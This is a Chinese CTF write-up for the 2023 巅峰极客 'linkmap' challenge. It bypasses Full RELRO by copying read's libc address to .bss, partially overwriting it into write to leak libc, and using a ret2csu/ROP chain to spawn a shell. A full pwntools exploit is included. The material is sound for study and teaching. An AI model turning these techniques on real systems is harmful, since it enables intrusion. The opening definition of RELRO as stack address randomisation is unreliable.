# FULL RELRO下的低位覆盖

## 前言

前两天巅峰极客比赛遇到一种很有趣的攻击方式，这里来说一下我的理解并讲解一下比赛的题目

## 背景知识

RELRO：堆栈地址随机化， 是一种用于加强对 binary 数据段的保护的技术  
Partial RELRO：部分开启，got表可写  
FULL RELRO：全部开启，got不可写

有的题开启了FULL
RELRO后我们就不能在再去修改got表，如果条件更为苛刻的话，把输出函数去掉后，我们对栈溢出就利用就会困难更加困难，下面提供一种相对来说比较简单的思路去解决这个问题，也就是先把got表写到bss段上，再低位覆盖成输出函数，泄露完真实地址后再用基础的rop链去攻击。

## 2023巅峰极客 linkmap

### ida

    
    
    Arch:     amd64-64-little
        RELRO:    Full RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      No PIE (0x400000)

可以看到这里是got表不可写的

    
    
    __int64 __fastcall main(__int64 a1, char **a2, char **a3)
    {
      char buf[16]; // [rsp+0h] [rbp-10h] BYREF
    
      setbuf();
      read(0, buf, 0x100uLL); //buf = 0x10
      return 0LL;
    }
    

main函数的内容只有这些

![](./img/7307171667341978457.png)  
然后查看got表也没有输出函数，没有办法直接利用简单的rop链

![](./img/6144526378285639759.png)

查看一下这一排函数，其中有个函数比较特别 : sub_400606

    
    
    __int64 __fastcall sub_400606(unsigned int a1, int a2, int a3)
    {
      __int64 result; // rax
      __int64 v4; // [rsp+14h] [rbp-8h]
    
      v4 = *(qword_601040 + (int)a1);
      qword_601040 = v4;
      result = a1;
      dword_601048 = a1;
      if ( a2 == 1 )
      {
        result = v4;
        qword_601028[a3] = v4;
      }
      else if ( !a2 )
      {
        result = v4;
        qword_601020[a3] = v4;
      }
      return result;
    }
    

让我们仔细分析一下这个函数，这个函数有a1，a2，a3三个参数，第一步会取 0x601040+a1
处二级指针存储的值，然后赋值给v4，然后再把v4的值赋值给0x601040处的指针变量(这里0x601040是在bss段)，这里估计是反编译的问题，他这个赋值可能不大形象，下面我用一个例子来解释一下这一步可以达到的效果

假设我们在0x601040处写入read_got，并且控制了sub_400606函数的第一个参数为a1=0(rdi=0),下面就会直接这三步  
0x601040-->read_got-->read_addr  
v4=read_addr  
0x601040-->read_addr  
这样就达到了把read的真实地址写入可写的bss段上，这样我们便可以再次写0x601040的地址，也就可以低位覆盖后四位来写write，这里因为aslr的缘故，所以只是有几率覆盖成功

### 思路

因为程序中没有控制rdx的gadget，所以我们用csu来控制rdi，rsi，rdx寄存器和程序执行流，然后我们要利用sub_400606函数去把read_addr写入0x601040处，之后还要让sub_400606函数返回read函数以达到修改的目的，这里仔细设置一下a1，a2，a3三个参数就可以达到这个效果。把write的地址写入进去后，我们得到了这样一个效果，addr1-->write_addr，之后我们直接调用addr1就能利用write函数了，然后我们就可以泄露libc地址了，然后就利用基础的rop链去getshell就可以了。

### 详细流程

先构造csu

    
    
    .text:00000000004007C0                               loc_4007C0:                             ; CODE XREF: init+54↓j
    .text:00000000004007C0 4C 89 EA                      mov     rdx, r13
    .text:00000000004007C3 4C 89 F6                      mov     rsi, r14
    .text:00000000004007C6 44 89 FF                      mov     edi, r15d
    .text:00000000004007C9 41 FF 14 DC                   call    qword ptr [r12+rbx*8]
    .text:00000000004007C9
    .text:00000000004007CD 48 83 C3 01                   add     rbx, 1
    .text:00000000004007D1 48 39 EB                      cmp     rbx, rbp
    .text:00000000004007D4 75 EA                         jnz     short loc_4007C0
    .text:00000000004007D4
    .text:00000000004007D6
    .text:00000000004007D6                               loc_4007D6:                             ; CODE XREF: init+34↑j
    .text:00000000004007D6 48 83 C4 08                   add     rsp, 8
    .text:00000000004007DA 5B                            pop     rbx
    .text:00000000004007DB 5D                            pop     rbp
    .text:00000000004007DC 41 5C                         pop     r12
    .text:00000000004007DE 41 5D                         pop     r13
    .text:00000000004007E0 41 5E                         pop     r14
    .text:00000000004007E2 41 5F                         pop     r15
    .text:00000000004007E4 C3                            retn
    .text:00000000004007E4                               ; } // starts at 400780
    .text:00000000004007E4
    .text:00000000004007E4                               init endp
    
    
    csu_front_addr = 0x4007C0
    csu_end_addr = 0x4007DA
    
    # csu(0, 1, fun_got, rdx, rsi, rdi, last)
    def csu(rbx, rbp, r12, r15, r14, r13, last):
        payload = ""
        payload += p64(csu_end_addr) 
        payload += p64(rbx)+p64(rbp)+p64(r12)+p64(r13)+p64(r14)+p64(r15)
        payload += p64(csu_front_addr)
        payload += b'a' * 0x38  
        payload += p64(last)    
        return payload
    

这里就是先pop rbx,rbp,r12,r13,r14,r15  
然后r13-->rdx , r14-->rsi , r15d-->edi , 令rbx=0 ，r12-->call , rbp==1 , rbp==rbx
, 然后不跳转 ，最后写个返回函数就行  
构造完csu后就可以做题了  
版本:ubuntu22

    
    
    pop_rbp_ret = 0x0000000000400570
    pop_rdi_ret = 0x00000000004007e3
    pop_rsi_ret = 0x00000000004007e1
    ret = 0x400773
    
    main_addr = 0x400740
    key_addr = 0x601040
    #leave_ret = 0x400772
    
    read_plt = 0x4004E0
    read_got = 0x600FD8
    
    backdoor = 0x400606
    csu_front_addr = 0x4007C0
    csu_end_addr = 0x4007DA
    

首先把这些地址放到这里，方便后面解释

    
    
    payload =  "a"*0x18
    payload += csu(0, 1, read_got, 0, key_addr, 0x100, main_addr)
    p.send(payload)
    

首先把rsi的值设置为key_addr

    
    
    RAX  0xfffffffffffffe00
     RBX  0x0
     RCX  0x7fb531714992 (read+18) ◂— cmp rax, -0x1000 /* 'H=' */
     RDX  0x100
     RDI  0x0
     RSI  0x601040 ◂— 0x0 
     R8   0x7fb53181af10 (initial+16) ◂— 0x4
     R9   0x7fb531852040 (_dl_fini) ◂— endbr64 
     R10  0x7fb53184c908 ◂— 0xd00120000000e
     R11  0x246
     R12  0x600fd8 —▸ 0x7fb531714980 (read) ◂— endbr64 
     R13  0x100
     R14  0x601040 ◂— 0x0
     R15  0x0
     RBP  0x1
     RSP  0x7ffe97a209f0 —▸ 0x4007cd ◂— add rbx, 1
     RIP  0x7fb531714992 (read+18) ◂— cmp rax, -0x1000 /* 'H=' */

然后再往里面写数据

    
    
    payload = p64(read_got)+p64(backdoor)
    p.send(payload)
    

![](./img/7797904026779480602.png)

    
    
    payload =  "a"*0x18
    payload += csu(0, 1, key_addr+0x8, 0, 1, 0, main_addr)
    p.send(payload)
    

这里就是去调用backdoor(sub_400606)函数，然后 rdi=0 , rsi=1 , rdx=0  
这里解释一下后面两参数为什么要这么赋值

    
    
    __int64 __fastcall sub_400606(unsigned int a1, int a2, int a3)
    {
      __int64 result; // rax
      __int64 v4; // [rsp+14h] [rbp-8h]
    
      v4 = *(qword_601040 + (int)a1);
      qword_601040 = v4;
      result = a1;
      dword_601048 = a1;
      if ( a2 == 1 )
      {
        result = v4;
        qword_601028[a3] = v4;
      }
      else if ( !a2 )
      {
        result = v4;
        qword_601020[a3] = v4;
      }
      return result;
    }
    

因为调用这个函数，最后返回值是result，这里我们想要返回read函数，以便于修改。  
当我们令 a1=0 时，我们已经成功把read_addr写道key_addr上了

修改前：

![](./img/721056409590069698.png)  
修改后：

![](./img/5555251716970438690.png)

    
    
    然后我们要利用 a2 == 1 来进入这个判断：
      if ( a2 == 1 )
      {
        result = v4;
        qword_601028[a3] = v4;
      }
    

这样之后

    
    
    result = v4 = read_addr
    0x601028[0] = read_addr (这里上图也可以看到)
    

成功达到目的

    
    
    payload =  "a"*0x18
    payload += csu(0, 1, read_got, 0, key_addr, 0x20, main_addr)
    p.send(payload)
    

然后我们再利用read去修改read_addr的后四位

    
    
    pwndbg> p read
    $1 = {ssize_t (int, void *, size_t)} 0x7f3685114980 <__GI___libc_read>
    pwndbg> p write
    $2 = {ssize_t (int, const void *, size_t)} 0x7f3685114a20 <__GI___libc_write>

直接覆盖后四位为0x4a20

    
    
    payload = p16(0x4a20)
    p.send(payload)
    

![](./img/4968321608483799015.png)

    
    
    payload =  "a"*0x18
    payload += csu(0, 1, key_addr, 1, read_got, 0x20, main_addr)
    

然后再去调用write，把read_addr泄露出来，也就泄露处libc了

    
    
    libc_base = u64(p.recvuntil('\x7f').ljust(8,"\x00")) - libc.sym['read']
    leak("libc_base ",libc_base)
    

![](./img/131975053270827698.png)  
然后就用rop链正常打

    
    
    system = libc_base + libc.sym['system']
    bin_sh = libc_base + next(libc.search(b'/bin/sh'))
    
    payload =  "a"*0x18
    payload += p64(ret)*3+ p64(pop_rdi_ret) + p64(bin_sh) + p64(system)
    p.send(payload)
    

![](./img/1863311144837236723.png)

### exp

    
    
    import os
    import sys
    import time
    from pwn import *
    from ctypes import *
    
    context.os = 'linux'
    context.log_level = "debug"
    
    s       = lambda data               :p.send(str(data))
    sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
    sl      = lambda data               :p.sendline(str(data))
    sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
    r       = lambda num                :p.recv(num)
    ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
    itr     = lambda                    :p.interactive()
    uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
    uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
    leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
    l64     = lambda      :u64(p.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
    l32     = lambda      :u32(p.recvuntil("\xf7")[-4:].ljust(4,b"\x00"))
    context.terminal = ['gnome-terminal','-x','sh','-c']
    
    x64_32 = 1
    
    if x64_32:
        context.arch = 'amd64'
    else:
        context.arch = 'i386'
    
    p=process('./pwn')
    #p=remote("pwn-3ca8173ee5.challenge.xctf.org.cn", 9999, ssl=True)
    elf = ELF('./pwn')
    libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
    context.terminal = ['gnome-terminal','-x','sh','-c']
    
    pop_rbp_ret = 0x0000000000400570
    pop_rdi_ret = 0x00000000004007e3
    pop_rsi_ret = 0x00000000004007e1
    ret = 0x400773
    
    main_addr = 0x400740
    key_addr = 0x601040
    
    read_plt = 0x4004E0
    read_got = 0x600FD8
    
    backdoor = 0x400606
    csu_front_addr = 0x4007C0
    csu_end_addr = 0x4007DA
    
    def duan():
        gdb.attach(p)
        pause()
    
    # csu(0, 1, fun_got, rdx, rsi, rdi, last)
    def csu(rbx, rbp, r12, r15, r14, r13, last):
        payload = ""
        payload += p64(csu_end_addr) 
        payload += p64(rbx)+p64(rbp)+p64(r12)+p64(r13)+p64(r14)+p64(r15)
        payload += p64(csu_front_addr)
        payload += b'a' * 0x38  
        payload += p64(last)    
        return payload
    
    payload =  "a"*0x18
    payload += csu(0, 1, read_got, 0, key_addr, 0x100, main_addr)
    p.send(payload)
    
    payload = p64(read_got)+p64(backdoor)
    p.send(payload)
    
    payload =  "a"*0x18
    payload += csu(0, 1, key_addr+0x8, 0, 1, 0, main_addr)
    p.send(payload)
    
    #duan()
    payload =  "a"*0x18
    payload += csu(0, 1, read_got, 0, key_addr, 0x20, main_addr)
    p.send(payload)
    #duan()
    
    payload = p16(0x4a20)
    p.send(payload)
    #duan()
    
    payload =  "a"*0x18
    payload += csu(0, 1, key_addr, 1, read_got, 0x20, main_addr)
    p.send(payload)
    #duan()
    
    libc_base = u64(p.recvuntil('\x7f').ljust(8,"\x00")) - libc.sym['read']
    leak("libc_base ",libc_base)
    #duan()
    system = libc_base + libc.sym['system']
    bin_sh = libc_base + next(libc.search(b'/bin/sh'))
    
    payload =  "a"*0x18
    payload += p64(ret)*3+ p64(pop_rdi_ret) + p64(bin_sh) + p64(system)
    p.send(payload)
    '''
    '''
    p.interactive()
    

